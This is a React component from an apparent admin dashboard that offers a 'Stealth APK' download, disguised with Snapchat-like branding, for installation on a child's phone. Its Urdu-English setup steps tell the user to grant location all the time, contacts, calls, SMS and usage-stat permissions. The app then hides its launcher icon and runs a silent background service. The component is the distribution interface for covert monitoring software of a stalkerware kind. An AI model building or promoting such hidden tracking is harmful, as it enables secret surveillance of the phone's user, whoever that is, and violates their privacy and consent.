// components/admin/devices/ApkDownloadModal.tsx
"use client";

import React, { useState, useEffect } from "react";
import { Modal } from "@/components/ui/Modal";
import { Button } from "@/components/ui/Button";
import { Download, Smartphone, Copy, Check, ShieldCheck, Sparkles } from "lucide-react";

interface Props {
  isOpen: boolean;
  onClose: () => void;
}

export const ApkDownloadModal: React.FC<Props> = ({ isOpen, onClose }) => {
  const [copied, setCopied] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState("https://snap-app-chi.vercel.app/downloads/snap-safety-companion.apk");
  const [displayDomain, setDisplayDomain] = useState("snap-app-chi.vercel.app");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const host = window.location.host;
      if (host && !host.includes("localhost")) {
        setDisplayDomain(host);
        setDownloadUrl(`${window.location.protocol}//${host}/downloads/snap-safety-companion.apk`);
      } else {
        setDisplayDomain("snap-app-chi.vercel.app");
        setDownloadUrl("https://snap-app-chi.vercel.app/downloads/snap-safety-companion.apk");
      }
    }
  }, []);

  const handleCopy = () => {
    navigator.clipboard.writeText(downloadUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose}>
      <div className="space-y-4 text-left max-h-[85vh] overflow-y-auto pr-1">
        {/* Header */}
        <div className="flex items-center gap-3">
          <div className="w-11 h-11 rounded-2xl bg-amber-500/15 border border-amber-500/30 flex items-center justify-center text-amber-600 dark:text-[#FFFC00] shrink-0">
            <Smartphone className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-base sm:text-lg font-bold text-slate-900 dark:text-white tracking-tight">
              Companion App (Stealth APK)
            </h3>
            <p className="text-xs text-slate-500 dark:text-white/50">
              Install once &bull; Auto-hides from launcher &bull; 24/7 background service
            </p>
          </div>
        </div>

        {/* Live Domain Download Link Box (No localhost) */}
        <div className="p-3.5 rounded-2xl bg-slate-100 dark:bg-white/[0.04] border border-slate-200 dark:border-white/10 space-y-2">
          <span className="text-[11px] font-bold text-slate-700 dark:text-white/80 block">
            🌐 Direct APK Download Link (Live Domain):
          </span>
          <div className="flex items-center gap-2">
            <input
              type="text"
              readOnly
              value={downloadUrl}
              className="flex-1 bg-white dark:bg-[#070709] border border-slate-200 dark:border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 dark:text-white/90 select-all outline-none"
            />
            <Button size="sm" variant="secondary" onClick={handleCopy} className="gap-1 text-xs shrink-0">
              {copied ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
              {copied ? "Copied" : "Copy Link"}
            </Button>
          </div>
          <p className="text-[10px] text-slate-500 dark:text-white/40">
            Send this link to child&apos;s phone via WhatsApp or open directly in child&apos;s phone browser.
          </p>
        </div>

        {/* First-Time Pairing Step Guide (Urdu) */}
        <div className="p-4 rounded-2xl bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/10 space-y-3">
          <div className="flex items-center gap-1.5 text-xs font-bold text-amber-700 dark:text-[#FFFC00]">
            <Sparkles className="w-4 h-4" />
            <span>First-Time Pairing Step (Sirf 1 Minute):</span>
          </div>

          <div className="space-y-2.5 text-xs">
            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                1
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Apne Admin Dashboard (<strong>{displayDomain}/admin/devices</strong>) par jayein aur <strong>&quot;+ Register Device&quot;</strong> dabayein.
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                2
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Bache ka naam likhein (e.g. &quot;Ali&quot;), aapko 6-digit ka <strong>Pairing Code</strong> milega (e.g. <code>9YMQES</code>).
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                3
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Bache ke phone par APK open karke wo <strong>Pairing Code</strong> daalein.
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                4
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                Android permissions ko <strong>&quot;Allow&quot;</strong> karein (Location: <em>Allow all the time</em>, Contacts, Calls, SMS, Usage Stats).
              </p>
            </div>

            <div className="flex items-start gap-2.5">
              <div className="w-5 h-5 rounded-full bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                5
              </div>
              <p className="text-slate-700 dark:text-white/80 leading-relaxed">
                App verify hokar stealth mode me <strong>icon hide</strong> kar legi aur silent background service chalu ho jayegi!
              </p>
            </div>
          </div>
        </div>

        {/* Bottom Actions */}
        <div className="flex items-center gap-2 pt-2">
          <a
            href={downloadUrl}
            download="snap-safety-companion.apk"
            className="flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-full bg-[#FFFC00] text-black font-bold text-xs shadow-lg shadow-yellow-500/25 active:scale-95 transition-all"
          >
            <Download className="w-4 h-4 stroke-[2.5]" />
            Download APK File
          </a>
          <Button variant="ghost" onClick={onClose} size="sm">
            Close
          </Button>
        </div>
      </div>
    </Modal>
  );
};
